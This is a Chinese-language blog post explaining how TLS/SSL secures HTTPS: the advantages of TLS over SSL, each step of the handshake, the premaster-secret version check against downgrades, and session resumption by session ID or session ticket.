<h3 id="TLS-Transport-Layer-Security，传输层安全协议"><a href="#TLS-Transport-Layer-Security，传输层安全协议" class="headerlink" title="TLS (Transport Layer Security，传输层安全协议)"></a>TLS (Transport Layer Security，传输层安全协议)</h3><p>用于两个应用程序之间提供保密性和数据完整性。</p>
<p>TLS 1.0是IETF（Internet Engineering Task Force，Internet工程任务组）制定的一种新的协议，它建立在SSL 3.0协议规范之上，是SSL 3.0的后续版本，可以理解为SSL 3.1，它是写入了 RFC 的。该协议由两层组成： TLS 记录协议（TLS Record）和 TLS 握手协议（TLS Handshake）。较低的层为 TLS 记录协议，位于某个可靠的传输协议（例如 TCP）上面。</p>
<h3 id="SSL-TLS协议作用："><a href="#SSL-TLS协议作用：" class="headerlink" title="SSL/TLS协议作用："></a>SSL/TLS协议作用：</h3><p>认证用户和服务器，确保数据发送到正确的客户机和服务器；<br>加密数据以防止数据中途被窃取；<br>维护数据的完整性，确保数据在传输过程中不被改变。</p>
<h3 id="TLS比SSL的优势"><a href="#TLS比SSL的优势" class="headerlink" title="TLS比SSL的优势"></a>TLS比SSL的优势</h3><p>对于消息认证使用密钥散列法：TLS 使用“消息认证代码的密钥散列法”（HMAC），当记录在开放的网络（如因特网）上传送时，该代码确保记录不会被变更。SSLv3.0还提供键控消息认证，但HMAC比SSLv3.0使用的（消息认证代码）MAC 功能更安全。</p>
<p>增强的伪随机功能（PRF）：PRF生成密钥数据。在TLS中，HMAC定义PRF。PRF使用两种散列算法保证其安全性。如果任一算法暴露了，只要第二种算法未暴露，则数据仍然是安全的。</p>
<p>改进的已完成消息验证：TLS和SSLv3.0都对两个端点提供已完成的消息，该消息认证交换的消息没有被变更。然而，TLS将此已完成消息基于PRF和HMAC值之上，这也比SSLv3.0更安全。</p>
<p>一致证书处理：与SSLv3.0不同，TLS试图指定必须在TLS之间实现交换的证书类型。</p>
<p>特定警报消息：TLS提供更多的特定和附加警报，以指示任一会话端点检测到的问题。TLS还对何时应该发送某些警报进行记录。</p>
<h3 id="SSL、TLS的握手过程"><a href="#SSL、TLS的握手过程" class="headerlink" title="SSL、TLS的握手过程"></a>SSL、TLS的握手过程</h3><p>SSL与TLS握手整个过程如下图所示，下面会详细介绍每一步的具体内容：</p>
<p><img src="http://7xq1il.com1.z0.glb.clouddn.com/clientHello.png" alt></p>
<h3 id="客户端首次发出请求"><a href="#客户端首次发出请求" class="headerlink" title="客户端首次发出请求"></a>客户端首次发出请求</h3><p>由于客户端(如浏览器)对一些加解密算法的支持程度不一样，但是在TLS协议传输过程中必须使用同一套加解密算法才能保证数据能够正常的加解密。在TLS握手阶段，客户端首先要告知服务端，自己支持哪些加密算法，所以客户端需要将本地支持的加密套件(Cipher Suite)的列表传送给服务端。除此之外，客户端还要产生一个随机数，这个随机数一方面需要在客户端保存，另一方面需要传送给服务端，客户端的随机数需要跟服务端产生的随机数结合起来产生后面要讲到的 Master Secret 。</p>
<p>客户端需要提供如下信息：<br>支持的协议版本，比如TLS 1.0版<br>一个客户端生成的随机数，稍后用于生成”对话密钥”<br>支持的加密方法，比如RSA公钥加密<br>支持的压缩方法</p>
<h3 id="服务端首次回应"><a href="#服务端首次回应" class="headerlink" title="服务端首次回应"></a>服务端首次回应</h3><p>服务端在接收到客户端的Client Hello之后，服务端需要确定加密协议的版本，以及加密的算法，然后也生成一个随机数，以及将自己的证书发送给客户端一并发送给客户端，这里的随机数是整个过程的第二个随机数。</p>
<p>服务端需要提供的信息：<br>协议的版本<br>加密的算法<br>随机数<br>服务器证书</p>
<h3 id="客户端再次回应"><a href="#客户端再次回应" class="headerlink" title="客户端再次回应"></a>客户端再次回应</h3><p>客户端首先会对服务器下发的证书进行验证，验证通过之后，则会继续下面的操作，客户端再次产生一个随机数（第三个随机数），然后使用服务器证书中的公钥进行加密，以及放一个ChangeCipherSpec消息即编码改变的消息，还有整个前面所有消息的hash值，进行服务器验证，然后用新秘钥加密一段数据一并发送到服务器，确保正式通信前无误。</p>
<p>客户端使用前面的两个随机数以及刚刚新生成的新随机数，使用与服务器确定的加密算法，生成一个Session Secret。</p>
<p>ChangeCipherSpec</p>
<p>ChangeCipherSpec是一个独立的协议，体现在数据包中就是一个字节的数据，用于告知服务端，客户端已经切换到之前协商好的加密套件（Cipher Suite）的状态，准备使用之前协商好的加密套件加密数据并传输了。</p>
<h3 id="服务器再次响应"><a href="#服务器再次响应" class="headerlink" title="服务器再次响应"></a>服务器再次响应</h3><p>服务端在接收到客户端传过来的第三个随机数的 加密数据之后，使用私钥对这段加密数据进行解密，并对数据进行验证，也会使用跟客户端同样的方式生成秘钥，一切准备好之后，也会给客户端发送一个 ChangeCipherSpec，告知客户端已经切换到协商过的加密套件状态，准备使用加密套件和 Session Secret加密数据了。之后，服务端也会使用 Session Secret 加密一段 Finish 消息发送给客户端，以验证之前通过握手建立起来的加解密通道是否成功。</p>
<h3 id="后续客户端与服务器间通信"><a href="#后续客户端与服务器间通信" class="headerlink" title="后续客户端与服务器间通信"></a>后续客户端与服务器间通信</h3><p>确定秘钥之后，服务器与客户端之间就会通过商定的秘钥加密消息了，进行通讯了。整个握手过程也就基本完成了。</p>
<p>值得特别提出的是：<br>SSL协议在握手阶段使用的是非对称加密，在传输阶段使用的是对称加密，也就是说在SSL上传送的数据是使用对称密钥加密的！因为非对称加密的速度缓慢，耗费资源。其实当客户端和主机使用非对称加密方式建立连接后，客户端和主机已经决定好了在传输过程使用的对称加密算法和关键的对称加密密钥，由于这个过程本身是安全可靠的，也即对称加密密钥是不可能被窃取盗用的，因此，保证了在传输过程中对数据进行对称加密也是安全可靠的，因为除了客户端和主机之外，不可能有第三方窃取并解密出对称加密密钥！如果有人窃听通信，他可以知道双方选择的加密方法，以及三个随机数中的两个。整个通话的安全，只取决于第三个随机数（Premaster secret）能不能被破解。</p>
<h3 id="其他补充"><a href="#其他补充" class="headerlink" title="其他补充"></a>其他补充</h3><p>对于非常重要的保密数据，服务端还需要对客户端进行验证，以保证数据传送给了安全的合法的客户端。服务端可以向客户端发出 Cerficate Request 消息，要求客户端发送证书对客户端的合法性进行验证。比如，金融机构往往只允许认证客户连入自己的网络，就会向正式客户提供USB密钥，里面就包含了一张客户端证书。</p>
<p>PreMaster secret前两个字节是TLS的版本号，这是一个比较重要的用来核对握手数据的版本号，因为在Client Hello阶段，客户端会发送一份加密套件列表和当前支持的SSL/TLS的版本号给服务端，而且是使用明文传送的，如果握手的数据包被破解之后，攻击者很有可能串改数据包，选择一个安全性较低的加密套件和版本给服务端，从而对数据进行破解。所以，服务端需要对密文中解密出来对的PreMaster版本号跟之前Client Hello阶段的版本号进行对比，如果版本号变低，则说明被串改，则立即停止发送任何消息。</p>
<h3 id="session的恢复"><a href="#session的恢复" class="headerlink" title="session的恢复"></a>session的恢复</h3><p>有两种方法可以恢复原来的session：一种叫做session ID，另一种叫做session ticket。</p>
<h3 id="session-ID"><a href="#session-ID" class="headerlink" title="session ID"></a>session ID</h3><p>session ID的思想很简单，就是每一次对话都有一个编号（session ID）。如果对话中断，下次重连的时候，只要客户端给出这个编号，且服务器有这个编号的记录，双方就可以重新使用已有的”对话密钥”，而不必重新生成一把。</p>
<p>session ID是目前所有浏览器都支持的方法，但是它的缺点在于session ID往往只保留在一台服务器上。所以，如果客户端的请求发到另一台服务器，就无法恢复对话</p>
<h3 id="session-ticket"><a href="#session-ticket" class="headerlink" title="session ticket"></a>session ticket</h3><p>客户端发送一个服务器在上一次对话中发送过来的session ticket。这个session ticket是加密的，只有服务器才能解密，其中包括本次对话的主要信息，比如对话密钥和加密方法。当服务器收到session ticket以后，解密后就不必重新生成对话密钥了。<br>目前只有Firefox和Chrome浏览器支持。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>https实际就是在TCP层与http层之间加入了SSL/TLS来为上层的安全保驾护航，主要用到对称加密、非对称加密、证书，等技术进行客户端与服务器的数据加密传输，最终达到保证整个通信的安全性。</p>
<p><a href="http://www.wxtlife.com/2016/03/27/%E8%AF%A6%E8%A7%A3https%E6%98%AF%E5%A6%82%E4%BD%95%E7%A1%AE%E4%BF%9D%E5%AE%89%E5%85%A8%E7%9A%84%EF%BC%9F/" target="_blank" rel="noopener">原文</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://shouliang.github.io/2017/02/09/网络安全/详解https是如何确保安全的/" data-id="cjujf4p5f007ecp6f3aud7hb8" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/6/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/8/">下一页 &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Git/">Git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Go系列教程/">Go系列教程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux性能优化/">Linux性能优化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MongoDB/">MongoDB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL实战/">MySQL实战</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Node-js/">Node.js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Redis/">Redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Unix/">Unix</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/从0开始学大数据/">从0开始学大数据</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/区块链/">区块链</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数据分析实战/">数据分析实战</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数据库/">数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数据结构与算法/">数据结构与算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/程序员的数学基础课/">程序员的数学基础课</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/网络安全/">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/计算机网络/">计算机网络</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/趣谈网络协议/">趣谈网络协议</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/Docker/" style="font-size: 12.22px;">Docker</a> <a href="/tags/Git/" style="font-size: 15.56px;">Git</a> <a href="/tags/Go系列教程/" style="font-size: 17.78px;">Go系列教程</a> <a href="/tags/Linux性能优化/" style="font-size: 14.44px;">Linux性能优化</a> <a href="/tags/MongoDB/" style="font-size: 11.11px;">MongoDB</a> <a href="/tags/MySQL实战/" style="font-size: 14.44px;">MySQL实战</a> <a href="/tags/Node-js/" style="font-size: 20px;">Node.js</a> <a href="/tags/Redis/" style="font-size: 11.11px;">Redis</a> <a href="/tags/Unix/" style="font-size: 13.33px;">Unix</a> <a href="/tags/从0开始学大数据/" style="font-size: 11.11px;">从0开始学大数据</a> <a href="/tags/区块链/" style="font-size: 10px;">区块链</a> <a href="/tags/数据分析实战/" style="font-size: 12.22px;">数据分析实战</a> <a href="/tags/数据库/" style="font-size: 11.11px;">数据库</a> <a href="/tags/数据结构与算法/" style="font-size: 18.89px;">数据结构与算法</a> <a href="/tags/程序员的数学基础课/" style="font-size: 14.44px;">程序员的数学基础课</a> <a href="/tags/网络安全/" style="font-size: 16.67px;">网络安全</a> <a href="/tags/计算机网络/" style="font-size: 10px;">计算机网络</a> <a href="/tags/趣谈网络协议/" style="font-size: 16.67px;">趣谈网络协议</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">十二月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">十一月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">七月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">六月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">五月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">四月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">三月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">二月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">一月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">十二月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">十一月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">九月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">八月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">六月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">二月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">一月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">十月 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">九月 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">八月 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">七月 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">六月 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">五月 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">四月 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">三月 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">五月 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/04/">四月 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/07/">七月 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/06/">六月 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/05/">五月 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/04/">四月 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/03/">三月 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/02/">二月 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/01/">一月 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/07/">七月 2012</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2019/01/23/程序员的数学基础课/18 | 总结课：数据结构、编程语句和基础算法体现了哪些数学思想/">18 | 总结课：数据结构、编程语句和基础算法体现了哪些数学思想？</a>
          </li>
        
          <li>
            <a href="/2019/01/16/Linux性能优化/03 | 基础篇：经常说的 CPU 上下文切换是什么意思？（上）/">03 | 基础篇：经常说的 CPU 上下文切换是什么意思？（上）</a>
          </li>
        
          <li>
            <a href="/2019/01/16/从0开始学大数据/预习 01 | 大数据技术发展史：大数据的前世今生/">预习 01 | 大数据技术发展史：大数据的前世今生</a>
          </li>
        
          <li>
            <a href="/2019/01/16/从0开始学大数据/预习 02 | 大数据应用发展史：从搜索引擎到人工智能/">预习 02 | 大数据应用发展史：从搜索引擎到人工智能</a>
          </li>
        
          <li>
            <a href="/2019/01/16/数据结构与算法/48 | B+树：MySQL数据库索引是如何实现的？/">48 | B+树：MySQL数据库索引是如何实现的？</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 shouliang<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>